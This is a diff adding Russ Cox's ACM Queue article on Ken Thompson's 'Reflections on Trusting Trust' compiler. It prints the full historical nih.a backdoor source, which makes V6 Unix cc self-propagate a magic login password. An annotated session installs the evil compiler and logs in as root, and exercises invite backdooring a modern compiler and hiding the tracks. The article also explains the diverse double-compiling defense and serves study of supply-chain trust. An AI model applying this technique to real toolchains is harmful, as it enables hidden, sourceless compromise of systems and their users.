@@ -479,9 +479,312 @@ We are redesigning the Queue website.
 
 
 
-	<p>Coming soon</p>
+  <h1 class="hidetitle">Running the “Reflections on Trusting Trust” Compiler</h1>
+  <h2>Revisiting Ken Thompson’s sourceless backdoor</h2>
+  <h3>Russ Cox</h3>
+  <p>In October 1983, Dennis Ritchie and Ken Thompson received the Turing Award for their work on Unix. Thompson’s lecture, reprinted in <i>Communications of the ACM</i> under the title “Reflections on Trusting Trust,”<sup>5</sup> explained in three steps how to modify a C compiler binary to insert a backdoor when compiling a target program, leaving no trace in any source code. This article revisits that backdoored compiler, presenting the original code Thompson wrote more than 50 years ago. First, a brief review of Thompson’s three steps.</p>
+  <p>&nbsp;</p>
+  <h3>Step 1: Write a Self-Reproducing Program</h3>
+  <p>Step 1 is to write a program that prints its own source code. Although such programs were not widely known in 1975, they are now known in computing as <i>quines</i> and were popularized by Douglas Hofstadter in his book <i>Gödel, Escher, Bach</i>.<sup>4</sup> Here is a quine in Python:<sup>6</sup></p>
+  <p><code>s='
+    <styled-content style="color:#7A0000">
+     <i>s=%r;print(s%%s)</i>
+    </styled-content>';print(s%s)</code></p>
+  <p>And here is a slightly less cryptic quine in Go:</p>
+  <p><code>package main<br />func main() { print(q + "\x60" + q + "\x60") }<br />var q = 
+    <styled-content style="color:#7A0000">
+     `package main
+    </styled-content><br />
+    <styled-content style="color:#7A0000">
+     func main() { print(q + "\x60" + q + "\x60") }
+    </styled-content> <br />
+    <styled-content style="color:#7A0000">
+     var q = `
+    </styled-content> <br /></code></p>
+  <p>The general idea of the solution is to put the text of the program into a string literal, with some kind of placeholder where the string itself should be repeated. Then the program prints the string literal, substituting that same literal for the placeholder. In the Python version, the placeholder is <code>%r</code>; in the Go version, the placeholder is implicit at the end of the string. Quines can be written in essentially any programming language and even in some file formats, such as zip files.<sup>3</sup></p>
+  <p>&nbsp;</p>
+  <h3>Step 2: Compilers Learn</h3>
+  <p>Step 2 is to notice that when a compiler compiles itself, important details can persist in the compiler binary without being present in the source code. Thompson gives the example of the numeric values of escape sequences in C strings. You can imagine a compiler containing code like this during the processing of escaped string literals:</p>
+  <p><code>c = next();<br />if(c == '\\') {<br />&nbsp;&nbsp;&nbsp;&nbsp;c = next();<br />&nbsp;&nbsp;&nbsp;&nbsp;if(c == 'n')<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c = '\n';<br />}</code></p>
+  <p>That code is responsible for processing the two-character sequence <code>\n</code> in a string literal and turning it into a corresponding byte value, specifically <code>'\n'</code>. But that’s a circular definition, and the first time you write code like that, it won’t compile. So, instead, you write <code>c = 10</code>, you compile and install the compiler, and <i>then</i> you can change the code to <code>c = '\n'</code>. The compiler has “learned” the value of <code>'\n'</code>, but that value appears only in the compiler binary, not in the source code.</p>
+  <p>&nbsp;</p>
+  <h3>Step 3: Learn a Backdoor</h3>
+  <p>Step 3 is to put these together to help the compiler “learn” to miscompile a target program (<code>login</code> in the lecture). It is fairly straightforward to add nefarious code to a compiler to recognize and modify a particular input program, but that nefarious code would be easy to find if the compiler source were inspected. Instead, we can go deeper, making two changes to the compiler:</p>
+  <p>• Recognize <code>login</code> and insert the backdoor.</p>
+  <p>• Recognize the compiler itself and insert the code for these two changes.</p>
+  <p>The “insert the code for these two changes” step requires being able to write a self-reproducing program: The code must reproduce itself into the new compiler binary. At this point, the compiler binary has “learned” the miscompilation steps, and the clean source code can be restored.</p>
+  <p>&nbsp;</p>
+  <h3>Running the Code</h3>
+  <p>Thompson saved the code for the backdoor in a file named <code>nih.a</code>, a cryptic name for a cryptic program. Today, <code>.a</code> files are normally archives containing compiler object files, but this one contains two source files. The code applies cleanly to the C compiler from the Research Unix Sixth Edition (V6). Let’s run the code and look at what it does. (If you want to type the commands yourself, you can follow along by running Sixth Edition Unix in an online PDP11 simulator.<sup>1</sup>)</p> <!--start manual edit--> 
+  <style> td.left { 	text-align:right; 	font-family:sans-serif; 	font-style: italic; 	padding:10px;margin:10px; 	vertical-align:top; 	width: 50% } td.right { 	text-align:left; 	font-family:monospace; 	font-style: normal; 	padding:10px;margin:10px; 	vertical-align:top; 	width: 50% } </style> 
+  <table style="padding:10px;margin:10px;"> 
+   <tbody>
+    <tr> 
+     <td class="left"> Login as ken, password ken. (The password is normally not shown.) </td> 
+     <td class="right"> login: <b>ken</b><br /> Password: <b>ken</b><br /> &nbsp;<br /> % <b>who</b><br /> ken?&nbsp;?&nbsp; tty8 Aug 14 22:06<br /> % </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Change to and list the <code>nih</code> directory, discovering a Unix archive. </td> 
+     <td class="right"> % <b>chdir nih</b><br /> % <b>ls</b><br /> nih.a </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Extract <code>nih.a</code>. </td> 
+     <td class="right"> % <b>ar xv nih.a</b><br /> x x.c<br /> x rc </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Let's read <code>x.c</code>, a C program. </td> 
+     <td class="right"> % <b>cat x.c</b> </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Declare the global variable <code>nihflg</code>, of implied type <code>int</code>. </td> 
+     <td class="right"> nihflg; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Define the function <code>codenih</code>, with implied return type <code>int</code> and no arguments. The compiler will be modified to call <code>codenih</code> during preprocessing, for each input line. </td> 
+     <td class="right"> codenih()<br /> {<br /> &nbsp; &nbsp; char *p,*s;<br /> &nbsp; &nbsp; int i; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> <code>cc -p</code> prints the preprocessor output instead of invoking the compiler back end. To avoid discovery, do nothing when <code>-p</code> is used. The implied return type of <code>codenih</code> is <code>int</code>, but early C allowed omitting the return value. </td> 
+     <td class="right"> &nbsp; &nbsp; if(pflag)<br /> &nbsp; &nbsp; &nbsp; return; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Skip leading tabs in the line. </td> 
+     <td class="right"> &nbsp; &nbsp; p=line;<br /> &nbsp; &nbsp; while(*p=='\t')<br /> &nbsp; &nbsp; &nbsp; &nbsp; p++; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Look for the line <nobr>"<code>name = crypt(pwbuf);</code>"</nobr> from <code>login.c</code>. If not found, jump to l1. </td> 
+     <td class="right"> &nbsp; &nbsp; s="namep = crypt(pwbuf);";<br /> &nbsp; &nbsp; for(i=0;i&lt;21;i++)<br /> &nbsp; &nbsp; &nbsp; &nbsp; if(s[i]!=p[i])<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; goto l1; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Define <code>login</code> backdoor code <code>s</code>, which does: <nobr>Check for the password "<code>codenih</code>".</nobr> If found, modify <code>namep</code> and <code>np</code> so that the code that follows in <code>login.c</code> will accept the password. </td> 
+     <td class="right"> &nbsp; &nbsp; p=+i;<br /> &nbsp; &nbsp; s="for(c=0;c&lt;8;c++)"<br /> &nbsp; &nbsp; &nbsp; "if(\"codenih\"[c]!=pwbuf[c])goto x1x;"<br /> &nbsp; &nbsp; &nbsp; "while(*namep)namep++;"<br /> &nbsp; &nbsp; &nbsp; "while(*np!=':')np++;x1x:"; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> With the <code>p=+i</code> from above, this is: <code>strcpy(p+i, s); return;</code>, appending the backdoor to the line. In early C, <code>+=</code> was spelled <code>=+</code>. The loop is <code>strcpy</code>, and <code>goto l4</code> jumps to the end of the function. </td> 
+     <td class="right"> &nbsp; &nbsp; for(i=0;;i++)<br /> &nbsp; &nbsp; &nbsp; &nbsp; if(!(*p++=s[i]))<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;break;<br /> &nbsp; &nbsp; goto l4; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> No match for <code>login</code> code. Next target: the distinctive line "<code>av[4] = "-P";</code>" from <code>cc.c</code>. If not found, jump to l2. </td> 
+     <td class="right"> l1:<br /> &nbsp; &nbsp; s="av[4] = \"-P\";";<br /> &nbsp; &nbsp; for(i=0;i&lt;13;i++)<br /> &nbsp; &nbsp; &nbsp; &nbsp; if(s[i]!=p[i])<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; goto l2; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Increment <code>nihflg</code> to 1 to remember evidence of being in <code>cc.c</code>, and return. </td> 
+     <td class="right"> &nbsp; &nbsp; nihflg++;<br /> &nbsp; &nbsp; goto l4; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Next target: the input reading loop in <code>cc.c</code>, but only if we've seen the <code>av[4]</code> line too: the text <nobr>"<code>while(getline()) {</code>"</nobr> is too generic and may be in other programs. If not found, jump to <code>l3</code>. </td> 
+     <td class="right"> l2:<br /> &nbsp; &nbsp; if(nihflg!=1)<br /> &nbsp; &nbsp; &nbsp; &nbsp; goto l3;<br /> &nbsp; &nbsp; s="while(getline()) {";<br /> &nbsp; &nbsp; for(i=0;i&lt;18;i++)<br /> &nbsp; &nbsp; &nbsp; &nbsp; if(s[i]!=p[i])<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; goto l3; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Append input-reading backdoor: call <code>codenih</code> (this very code!) after reading each line. Increment <code>nihflg</code> to 2 to move to next state. </td> 
+     <td class="right"> &nbsp; &nbsp; p=+i;<br /> &nbsp; &nbsp; s="codenih();";<br /> &nbsp; &nbsp; for(i=0;;i++)<br /> &nbsp; &nbsp; &nbsp; &nbsp; if(!(*p++=s[i]))<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;<br /> &nbsp; &nbsp; nihflg++;<br /> &nbsp; &nbsp; goto l4; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Next target: the flushing of output in <code>cc.c</code>. </td> 
+     <td class="right"> l3:<br /> &nbsp; &nbsp; if(nihflg!=2)<br /> &nbsp; &nbsp; &nbsp; &nbsp; goto l4;<br /> &nbsp; &nbsp; s="fflush(obuf);";<br /> &nbsp; &nbsp; for(i=0;i&lt;13;i++)<br /> &nbsp; &nbsp; &nbsp; &nbsp; if(s[i]!=p[i])<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; goto l4; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Insert end-of-file backdoor: call <code>repronih</code> to reproduce this very source file (the definitions of <code>codenih</code> and <code>repronih</code>) at the end of the now-backdoored text of <code>cc.c</code>. </td> 
+     <td class="right"> &nbsp; &nbsp; p=+i;<br /> &nbsp; &nbsp; s="repronih();";<br /> &nbsp; &nbsp; for(i=0;;i++)<br /> &nbsp; &nbsp; &nbsp; &nbsp; if(!(*p++=s[i]))<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;<br /> &nbsp; &nbsp; nihflg++;<br /> l4:;<br /> } </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Here the magic begins, as presented in the Turing lecture. The <code>%0</code> is not valid C. Instead, the script <code>rc</code> will replace the <code>%</code> with byte values for the text of this exact file, to be used by <code>repronih</code>. </td> 
+     <td class="right"> char nihstr[]<br /> {<br /> %0<br /> }; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> The magic continues. </td> 
+     <td class="right"> repronih()<br /> {<br /> &nbsp; &nbsp;int i,n,c; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> If <code>nihflg</code> is not 3, this is not <code>cc.c</code> so don't do anything. </td> 
+     <td class="right"> &nbsp; &nbsp; if(nihflg!=3)<br /> &nbsp; &nbsp; &nbsp; &nbsp; return; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> The most cryptic part of the whole program. Scan over <code>nihstr</code> (indexed by <code>i</code>) in five phases according to the value <code>n</code>: 
+      <div style="float:right;margin:0px;"> 
+       <p style="text-align:left"> <code>n=0:</code> emit literal text before "<code>%</code>"<br /> <code>n=1:</code> emit octal bytes of text before "<code>%</code>"<br /> <code>n=2:</code> emit octal bytes of "<code>%</code>" and rest of file<br /> <code>n=3:</code> no output, looking for "<code>%</code>"<br /> <code>n=4:</code> emit literal text after "<code>%</code>" </p> 
+      </div></td> 
+     <td class="right"> &nbsp; &nbsp; n=0;<br /> &nbsp; &nbsp; i=0;<br /> &nbsp; &nbsp; for(;;)<br /> &nbsp; &nbsp; switch(c=nihstr[i++]){ </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> <code>045</code> is '<code>%</code>', kept from appearing except in the magic location inside <code>nihstr</code>. Seeing <code>%</code> increments the phase. The phase transition 0 → 1 rewinds the input. Only phase 2 keeps processing the <code>%</code>. </td> 
+     <td class="right"> &nbsp; &nbsp; case 045:<br /> &nbsp; &nbsp; &nbsp; &nbsp; n++;<br /> &nbsp; &nbsp; &nbsp; &nbsp; if(n==1)<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i=0;<br /> &nbsp; &nbsp; &nbsp; &nbsp; if(n!=2)<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; continue; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> In phases 1 and 2, emit octal byte value (like <code>0123</code>,) to appear inside <code>nihstr</code>. Note the comma to separate array elements, so the 0 in <code>nihstr</code>'s <code>%0</code> above is a final, terminating NUL byte for the array. </td> 
+     <td class="right"> &nbsp; &nbsp; default:<br /> &nbsp; &nbsp; &nbsp; &nbsp; if(n==1||n==2){<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; putc('0',obuf);<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(c&gt;=0100)<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; putc((c&gt;&gt;6)+'0',obuf);<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(c&gt;=010)<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; putc(((c&gt;&gt;3)&amp;7)+'0',obuf);<br /> &nbsp; &nbsp; &nbsp; &nbsp; putc((c&amp;7)+'0',obuf);<br /> &nbsp; &nbsp; &nbsp; &nbsp; putc(',',obuf);<br /> &nbsp; &nbsp; &nbsp; &nbsp; putc('\n',obuf);<br /> &nbsp; &nbsp; &nbsp; &nbsp; continue;<br /> &nbsp; &nbsp; &nbsp; &nbsp; } </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> In phases 0 and 4, emit literal byte value, to reproduce source file around the <code>%</code>. </td> 
+     <td class="right"> &nbsp; &nbsp; &nbsp; &nbsp; if(n!=3)<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; putc(c,obuf);<br /> &nbsp; &nbsp; &nbsp; &nbsp; continue; </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Reaching end of <code>nihstr</code> increments the phase and rewinds the input. The phase transition 4 → 5 ends the function. </td> 
+     <td class="right"> &nbsp; &nbsp; case 0:<br /> &nbsp; &nbsp; &nbsp; &nbsp; n++;<br /> &nbsp; &nbsp; &nbsp; &nbsp; i=0;<br /> &nbsp; &nbsp; &nbsp; &nbsp; if(n==5){<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fflush(obuf);<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return;<br /> &nbsp; &nbsp; &nbsp; &nbsp; }<br /> &nbsp; &nbsp; }<br /> } </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Now let's read <code>rc</code>, a shell script. </td> 
+     <td class="right"> % <b>cat rc</b> </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Start the editor <code>ed</code> on <code>x.c</code>. The V6 shell <code>sh</code> opened input scripts on standard input, sharing it with invoked commands, so the lines that follow are for <code>ed</code>. </td> 
+     <td class="right"> ed x.c </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Delete all tabs from every line. </td> 
+     <td class="right"> 1,$s/ &nbsp; &nbsp; //g </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Write the modified file to <code>nih.c</code> and quit. The shell will continue reading the input script. </td> 
+     <td class="right"> w nih.c<br /> q </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Octal dump bytes of <code>nih.c</code> into <code>x</code>. The output looks like: <p><code> % echo az | od -b &nbsp; &nbsp; &nbsp;<br /> 0000000 141 172 012 000<br /> 0000003 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br /> % &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </code></p> Note the trailing <code>000</code> for an odd-sized input. </td> 
+     <td class="right"> od -b nih.c &gt;x </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Back into <code>ed</code>, this time editing <code>x</code>. </td> 
+     <td class="right"> ed x </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Remove the leading file offsets, adding a 0 at the start of the first byte value. </td> 
+     <td class="right"> 1,$s/^....... 0*/0/ </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Replace each space before a byte value with a newline and a leading 0. Now all the octal values are C octal constants. </td> 
+     <td class="right"> 1,$s/ 0*/\<br /> 0/g </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Delete 0 values caused by odd-length padding or by the final offset-only line. </td> 
+     <td class="right"> g/^0$/d </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Add trailing commas to each line. </td> 
+     <td class="right"> 1,$s/$/,/ </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Write <code>x</code> and switch to <code>nih.c</code>. </td> 
+     <td class="right"> w x<br /> e nih.c </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Move to and delete the magic <code>%0</code> line. </td> 
+     <td class="right"> /%/d </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Read <code>x</code> (the octal values) into the file there. </td> 
+     <td class="right"> .-1r x </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Add a trailing 0 to end the array. </td> 
+     <td class="right"> .a<br /> 0<br /> . </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Write <code>nih.c</code> and quit. All done! </td> 
+     <td class="right"> w nih.c<br /> q </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Let's run <code>rc</code>. <br />The numbers are ed printing file sizes each time it reads or writes a file. </td> 
+     <td class="right"> % <b>sh rc</b><br /> 1314<br /> 1163<br /> 5249<br /> 6414<br /> 1163<br /> 6414<br /> 7576 </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Let's check the output, <code>nih.c</code>.<br /> The tabs are gone and the octal bytes are there! </td> 
+     <td class="right"> % <b>cat nih.c</b><br /> nihflg;<br /> codenih()<br /> {<br /> char *p,*s;<br /> int i;<br /> if(pflag)<br /> return;<br /> ...<br /> char nihstr[]<br /> {<br /> 0156,<br /> 0151,<br /> 0150,<br /> 0146,<br /> ...<br /> 0175,<br /> 012,<br /> 0175,<br /> 012,<br /> 0<br /> };<br /> repronih()<br /> {<br /> int i,n,c;<br /> ... </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Let's make an evil compiler, applying the <code>codenih</code> changes by hand. </td> 
+     <td class="right"> % <b>cp /usr/source/s1/cc.c cc.c</b><br /> % <b>cp cc.c ccevil.c</b><br /> % <b>ed ccevil.c</b><br /> 12902 </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Add <code>codenih</code> after <code>getline</code>. </td> 
+     <td class="right"> <b>/getline/</b><br /> &nbsp; &nbsp; while(getline()) {<br /> <b>s/$/ codenih();/</b><br /> <b>.</b><br /> &nbsp; &nbsp; while(getline()) { codenih(); </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Add <code>repronih</code> after <code>fflush</code>. </td> 
+     <td class="right"> <b>/fflush/</b><br /> &nbsp; &nbsp; fflush(obuf);<br /> <b>s/$/ repronih();/</b><br /> <b>.</b><br /> &nbsp; &nbsp; fflush(obuf); repronih(); </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Add <code>nih.c</code> at the end of the file. </td> 
+     <td class="right"> <b>$r nih.c</b><br /> 7576<br /> <b>w</b><br /> 20501<br /> <b>q</b> </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Build the evil and good code with the good cc. </td> 
+     <td class="right"> % <b>cc ccevil.c; mv a.out ccevil</b><br /> % <b>cc cc.c; mv a.out ccgood</b><br /> % <b>ls -l ccevil ccgood</b><br /> <nobr>-rwxrwxrwx?&nbsp;1 ken &nbsp; &nbsp; 12918 Aug 14 22:19 ccevil</nobr><br /> <nobr>-rwxrwxrwx?&nbsp;1 ken &nbsp; &nbsp; 10724 Aug 14 22:19 ccgood</nobr> </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> The good compiler still compiles the original <code>cc.c</code> correctly. </td> 
+     <td class="right"> % <b>ccgood cc.c</b><br /> % <b>ls -l a.out</b><br /> <nobr>-rwxrwxrwx?&nbsp;1 ken &nbsp; &nbsp; 10724 Aug 14 22:19 a.out</nobr> </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> The evil compiler compiles the original <code>cc.c</code> with the backdoor: 12,918 bytes instead of 10,724. </td> 
+     <td class="right"> % <b>ccevil cc.c</b><br /> % <b>ls -l a.out</b><br /> <nobr>-rwxrwxrwx?&nbsp;1 ken &nbsp; &nbsp; 12918 Aug 14 22:19 a.out</nobr> </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> The evil compilers don't match exactly, but only because the binary contains the name of the source file (<code>ccevil.c</code> versus <code>cc.c</code>). One more round will converge them. </td> 
+     <td class="right"> % <b>cmp a.out ccevil</b><br /> a.out ccevil differ: char 9428, line 377<br /> % <b>cmp -l a.out ccevil</b><br /> &nbsp;9428 &nbsp;56 145<br /> &nbsp;9429 157 166<br /> &nbsp;9430 &nbsp;?0 151<br /> &nbsp;9431 &nbsp;?0 154<br /> &nbsp;9432 &nbsp;?0?&nbsp;56<br /> &nbsp;9433 &nbsp;?0 157<br /> % <b>cp a.out ccevil</b><br /> % <b>ccevil cc.c</b><br /> % <b>cmp a.out ccevil</b><br /> % </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Let's install the evil compiler. </td> 
+     <td class="right"> % <b>su</b><br /> password: <b>root</b><br /> # <b>cp ccevil /bin/cc</b> </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Let's rebuild everything from clean sources. The compiler still contains the backdoor. </td> 
+     <td class="right"> # <b>cc /usr/source/s1/cc.c</b><br /> # <b>cp a.out /bin/cc</b><br /> # <b>ls -l /bin/cc</b><br /> <nobr>-rwxrwxr-x?&nbsp;1 bin &nbsp; &nbsp; 12918 Aug 14 22:30 /bin/cc</nobr><br /> # <b>cc /usr/source/s1/login.c</b><br /> # <b>cp a.out /bin/login</b><br /> # ^D </td> 
+    </tr> 
+    <tr> 
+     <td class="left"> Now we can log in as root with the magic password. </td> 
+     <td class="right"> % ^D<br /> &nbsp;<br /> login: <b>root</b><br /> Password: <b>codenih</b><br /> &nbsp;<br /> # <b>who</b><br /> root?&nbsp; &nbsp;tty8 Aug 14 22:32<br /> # </td> 
+    </tr> 
+   </tbody>
+  </table> <!--end manual edit--> 
+  <br />
+  <p>&nbsp;</p>
+  <h3>Reflections on “Reflections” and Exercises</h3>
+  <p>When Thompson sent me <code>nih.a</code> and I got it running, my immediate reaction was disbelief at the size of the change: 99 lines of code, plus a 20-line shell script. If you already know how to make a program print itself, the biggest surprise is that there are no surprises! It’s one thing to say, “I know how to do it in theory,” and quite another to see how small and straightforward the backdoor is in practice. Seeing it run and seeing how tiny it is really drives home how easy it would be to make a change like this and how important it is to build from trusted sources using trusted tools. I don’t say any of this to diminish Thompson’s doing it in the first place: It seems easy <i>because</i> he did it and explained it to us. But it’s still very little code for an extremely serious outcome.</p>
+  <p>Thompson reports that the backdoor never left AT&amp;T, but a version did get installed on the Unix system, used by the Programmer’s Workbench group. That version was discovered because the compiler grew on repeated recompilation.</p> 
+  <div style="margin-left:24pt;">
+   <p><b><i>Exercise:</i></b> Reintroduce the bug, making <code>nihstr</code> grow by one byte on each recompilation.</p>
+  </div>
+  <p>Even seeing the code run in the V6 simulator, it can be easy to mentally dismiss this kind of backdoor as an old problem.</p>
+  <div style="margin-left:24pt;">
+   <p><b><i>Exercise:</i></b> Add this backdoor to a modern compiler: Change the compiler to compile the usual “hello, world” program to print “backdoored!” instead, and then cover your tracks.</p>
+  </div>
+  <p>An important advancement of the past couple of decades is that there is a defense against this backdoor, which is to build the compiler source using two different compilers, as shown in figure 1.</p>
+  <img src="https://spawn-queue.acm.org/cms/attachment/html/10.1145/3786614/assets/html/3786614_fig12.jpg" alt="Figure 1. 
+Compiler source built using two different compilers
+" />
+  <br />Figure 1. Compiler source built using two different compilers
+  <p>Specifically, suppose you have the suspect binary—compiler 1—and its source code. First, compile that source code with a trusted second compiler, compiler 2, producing compiler 2.1. If everything is on the up and up, compiler 1 and compiler 2.1 should be semantically equivalent, even though they will be very different at the binary level, since they were generated by different compilers. Also, compiler 2.1 cannot contain a binary-only backdoor inserted by compiler 1, since it wasn’t compiled with that compiler. Now compile the source code again with both compiler 1 and compiler 2.1. If they really are semantically equivalent, then the outputs, compilers 1.1 and 2.1.1, should be bit-for-bit identical. If that’s true, then you’ve established that compiler 1 does not insert any backdoors when compiling itself.</p>
+  <p>The great thing about this process is that you don’t even need to know which of compiler 1 and 2 might be backdoored. If compilers 1.1 and 2.1.1 are identical, then they’re both either clean or backdoored the same way. If compilers 1 and 2 are independent implementations from independent sources, the chance of both being backdoored the same way is far less likely than the chance of compiler 1 being backdoored. We’ve bootstrapped trust in compiler 1 by comparing it against compiler 2, and vice versa. This approach is called <i>diverse double-compiling</i>.<sup>7</sup></p>
+  <div style="margin-left:24pt;">
+   <p><b><i>Exercise:</i></b> Use diverse double-compiling to detect the backdoor you added in the previous exercise.</p>
+  </div>
+  <p>This code can be dated to some time in the one-year period from June 1974 to June 1975, probably early 1975, making it at least 50 years old and almost certainly the oldest code ever published in <i>Queue</i>. Thompson kept it for all that time and then shared it with me in September 2023. (I asked for it after he mentioned during a public talk that he was waiting for someone to ask!) An earlier version of this article, which appeared on my personal blog, contains detailed references for the timeline and deployment of the backdoor as well as solutions to these exercises.<sup>2</sup></p>
+  <p>&nbsp;</p>
+  <p><b>Russ Cox</b> is a distinguished engineer at Google, where he had the good fortune to work with Ken Thompson on the Go programming language and its compiler.</p>
+  <p>&nbsp;</p>
+  <p>&nbsp;</p>
+  <h3>References</h3>
+  <p>1. Cox, R. Research Unix Sixth Edition (WASM). research!rsc, 2023; <a href="https://research.swtch.com/v6">https://research.swtch.com/v6</a>.</p>
+  <p>2. Cox, R. Running the “Reflections on Trusting Trust” compiler. research!rsc, 2023; <a href="https://research.swtch.com/nih">https://research.swtch.com/nih</a>.</p>
+  <p>3. Cox, R. Zip files all the way down. research!rsc, 2010; <a href="https://research.swtch.com/zip">https://research.swtch.com/zip</a>.</p>
+  <p>4. Hofstadter, D. Gödel, Escher, Bach: An Eternal Golden Braid. Basic Books, New York, NY 1979.</p>
+  <p>5. Thompson, K. Reflections on trusting trust. <i>Communications of the ACM</i> 27, 8 1984, 761–763; <a href="https://tinyurl.com/y3h5qfz4">https://tinyurl.com/y3h5qfz4</a>.</p>
+  <p>6. Toal, R. Quine programs; <a href="https://cs.lmu.edu/~ray/notes/quineprograms/">https://cs.lmu.edu/~ray/notes/quineprograms/</a>.</p>
+  <p>7. Wheeler, D. Fully countering trusting trust through diverse double-compiling. Ph.D. thesis, George Mason University, 2009; <a href="https://dwheeler.com/trusting-trust/">https://dwheeler.com/trusting-trust/</a>.</p>
+  <p>Copyright © 2025 held by the owner/author(s). Publication rights licensed to ACM.</p>
+  <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;rayId&quot;:&quot;9cb455e6ce550b11&quot;,&quot;serverTiming&quot;:{&quot;name&quot;:{&quot;cfExtPri&quot;:true,&quot;cfEdge&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfL4&quot;:true,&quot;cfSpeedBrain&quot;:true,&quot;cfCacheStatus&quot;:true}},&quot;version&quot;:&quot;2025.9.1&quot;,&quot;token&quot;:&quot;b7f168b3cd354a55a4dd51b513830799&quot;}" crossorigin="anonymous"></script> 
+ <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9cc3dcd12b252d1f',t:'MTc3MDgxMzA3OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script> 
 
-
+	<p>
+	
+		<img class="floatLeft" src="img/q stamp_small.jpg" width="26" height="45" alt="acmqueue"><br><br>
+	
+	<em>Originally published in Queue vol. 23, no. 6</em>&#8212;
+ 	<br>
